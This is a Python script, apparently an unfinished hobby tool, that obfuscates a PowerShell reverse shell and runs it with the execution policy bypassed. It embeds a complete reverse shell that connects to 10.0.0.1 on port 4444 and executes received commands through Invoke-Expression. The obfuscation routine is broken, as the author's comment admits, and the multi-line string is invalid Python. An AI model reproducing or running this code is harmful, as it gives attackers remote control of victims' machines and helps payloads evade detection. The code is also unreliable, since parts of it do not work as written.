# Language: python
# FILEPATH: obfuscate.py

import base64
import sys
import subprocess

# Take a powershell reverse shell payload as a command line argument and obfuscate it

def obfuscate(payload):
    payload = base64.b64encode(payload.encode('utf-16le')).decode('utf-8')
    payload = payload.replace('=', chr(ord('=') + 1))
    payload = payload[::-1]
    payload = 'powershell -nop -enc ' + payload
    return payload

def execute(payload):
    payload = obfuscate(payload)
    print(payload)
    with open('hyperload.ps1', 'w') as f:
        f.write(payload)
    subprocess.call(['powershell.exe', '-ExecutionPolicy', 'Bypass', '-File', 'hyperload.ps1'])
 # Work in progress, I still gotta deobfuscate it in memory so it works lol
 
rshill = '
# Replace IP and Port below
$ip = "10.0.0.1"
$port = 4444

$client = New-Object System.Net.Sockets.TCPClient($ip, $port)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

while($client.Connected) {
    $line = $reader.ReadLine()
    $output = (Invoke-Expression $line 2>&1 | Out-String)
    $writer.WriteLine($output)
    $writer.Flush()
}

$client.Close()'

execute(rshill)

